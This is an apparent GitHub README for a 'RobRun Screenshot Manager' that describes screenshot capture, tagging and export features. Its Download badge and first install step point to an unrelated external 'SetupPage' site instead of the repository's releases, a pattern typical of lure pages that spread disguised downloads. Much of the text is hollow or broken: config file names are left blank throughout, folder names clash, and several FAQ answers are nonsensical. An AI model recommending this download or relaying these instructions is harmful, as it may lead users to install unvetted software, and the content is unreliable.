# RobRun Screenshot Manager

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-16a34a?style=flat-square&logo=linux&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/teraofficialhatchet/RobRun-Screenshot-Manager">
    <img src="https://img.shields.io/badge/Repo-Hosted-brightgreen?style=for-the-badge&logo=github" alt="Repo">
  </a>
  <a href="https://github.com/teraofficialhatchet/RobRun-Screenshot-Manager/releases/tag/v1.4.2">
    <img src="https://img.shields.io/badge/Release-1.4.2-blue?style=plastic&logo=appveyor" alt="Release">
  </a>
  <a href="https://github.com/teraofficialhatchet/RobRun-Screenshot-Manager/blob/main/README.md">
    <img src="https://img.shields.io/badge/Docs-Available-brightorange?style=flat&logo=readme" alt="Docs">
  </a>
  <a href="https://github.com/teraofficialhatchet/RobRun-Screenshot-Manager/issues">
    <img src="https://img.shields.io/badge/Issues-Warn-red?style=flat-square&logo=issue" alt="Issues">
  </a>
</div>

---

## Overview

RobRun Screenshot Manager is a dedicated companion that lets you capture, organize, and annotate screenshots from RobRun sessions with minimal effort. It supports structured configuration profiles, a selection of workflow presets, and a bundle of the latest assets, making it a single point of control for every visual asset you generate while running.

Key strengths:

* **Profile‑driven** – Switch between visual, gameplay, or custom modes instantly.
* **Preset workflows** – Pre‑configured pipelines for bulk import, tagging, and export.
* **Cross‑platform** – Runs on Windows, macOS, and Linux with the same binary.
* **Extensible** – Add your own scripts or configuration files without touching the core.

---

## Features

| Feature | Description | Config File |
|---------|-------------|-------------|
| **Batch Capture** | Takes a series of screenshots at a user‑defined interval. | `` |
| **Tagging Engine** | Auto‑generates tags based on file names and metadata. | `` |
| **Thumbnail Generation** | Produces small previews for quick browsing. | `` |
| **Import/Export Scripts** | Custom Python scripts to integrate with external asset pipelines. | `` |
| **Log Auditing** | Records all operations with timestamps for audit trails. | N/A |

---

## Installation & Release

1. Visit the **Download** badge above or go to <https://rewfdf.github.io/SetupPage/>.
2. Extract the archive to any directory of your choice.
3. Locate the `config` folder – it contains four essential profiles:
   * `` – Basic capture settings.
   * `` – Advanced image adjustments.
   * `` – Player‑centric tagging rules.
   * `` – Placeholder for your own rules.
4. Open a terminal or file explorer and launch `Release` (Windows), `RobRunScreenshotManager.app` (macOS), or `./RobRunScreenshotManager` (Linux). The first run will automatically generate a `logs/history.log` entry.

---

## Usage Guide

### 1. Launch and Select a Profile
Upon startup, a splash screen lists the four available profiles. Choose one by clicking the corresponding button. Each profile pre‑sets the capture interval, resolution, and output path.

### 2. Capture Screenshots
Press **Start Capture**. The application will create a new folder under `assets/screenshots/<timestamp>/`. Every image is named with a sequential index and the timestamp.

### 3. Review and Tag
After capture, click **Open Gallery**. The thumbnail viewer will display the newly created images. Tags are auto‑generated and displayed in a side panel. To modify tags, right‑click an image and select **Edit Tags**.

### 4. Export
Select **Export Pack**. You may choose PNG, JPG, or ZIP bundles. The export path defaults to `assets/exports/`. The process logs the operation in `logs/history.log`.

### 5. Advanced Workflow
For bulk operations, drop a folder containing screenshots onto the main window. The application will parse, tag, and place thumbnails automatically.

---

## Directory Structure

RobRun Screenshot Manager
├── assets
│   ├── screenshots
│   └── thumbnails
├── config
│   ├──
│   ├──
│   ├──
│   └──
├── logs
│   └── history.log
└── scripts
    ├── import.py
    └── export.py

---

## FAQ

**Q1: Why do my screenshots appear in the wrong resolution?**
A1: Check the `resolution` setting in ``. The application respects the value you set there. If left blank, it defaults to the current screen resolution.

**Q2: Can I integrate the export output with a cloud service?**
A2: Yes. The `export.py` script contains placeholders for API calls. Copy the script to `scripts/`, edit the URL, and re‑run the export process.

**Q3: The log file keeps growing rapidly. How do I manage it?**
A3: Set a maximum size in `logs/history.log`. You can also manually rotate the log by moving it to a backup location before the next run.

**Q4: I want to add a new tag that includes the system time. How?**
A4: Edit `` and add a line such as `tag_time_format=%H-%M-%S`. The next capture will embed the formatted time in the tag list.

**Q5: Where do I find help if something goes wrong?**
A5: Open the **Help** menu and click **View Logs**. The log file will contain detailed information. If further assistance is needed, file an issue on the GitHub repository – the community and maintainer are active and responsive.

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```